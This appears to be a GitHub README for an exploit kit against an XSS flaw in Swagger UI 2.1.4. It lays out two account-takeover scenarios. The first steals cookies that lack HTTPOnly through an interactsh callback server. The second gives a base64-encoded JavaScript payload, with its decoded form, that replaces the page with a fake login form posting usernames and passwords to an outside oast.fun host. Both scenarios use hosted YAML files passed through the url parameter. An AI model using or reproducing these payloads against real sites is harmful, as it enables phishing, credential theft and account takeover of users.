# ExploitSwaggerXSS

## Scenario 1 - Account TakeOver with unsecure cookies (HTTPOnly = false)
1. Go to https://app.interactsh.com/ and copy your server dns.
2. Host an equivalent of this raw file on your server,modify your interact sh server and launch it :
3. ``` https://redacted.dtd/swagger-ui/webjars/swagger-ui/2.1.4/index.html?url=https://raw.githubusercontent.com/niranc/ExploitSwaggerXSS/main/exploit.yaml ```

## Scenario 2 - ATO via malicious form
1. Create a base64 payload with your malicious server

```$ echo "ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovL3hlYmJxZ3ZzcWJybGJ4cXB2Z2h3YTJ4cTBobGNndDk5ZC5vYXN0LmZ1bi9jcmVkcy5waHAiO2EubWV0aG9kPSdQT1NUJzthLmlubmVySFRNTD0nPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOwo=" |base64 -d```

```document.body.innerHTML=''; var a=document.createElement('form');a.action="http://xebbqgvsqbrlbxqpvghwa2xq0hlcgt99d.oast.fun/creds.php";a.method='POST';a.innerHTML='<center>Username: <input type="text" name="userName"><br>Password: <input type="password" name="pwd"><br><input type="submit" value="Login"></center>'; document.body.appendChild(a);```

2. Host an equivalent of this raw file on your server and launch it :
``` https://redacted.dtd/swagger-ui/webjars/swagger-ui/2.1.4/index.html?url=https://raw.githubusercontent.com/niranc/ExploitSwaggerXSS/main/exploitform.yaml ```



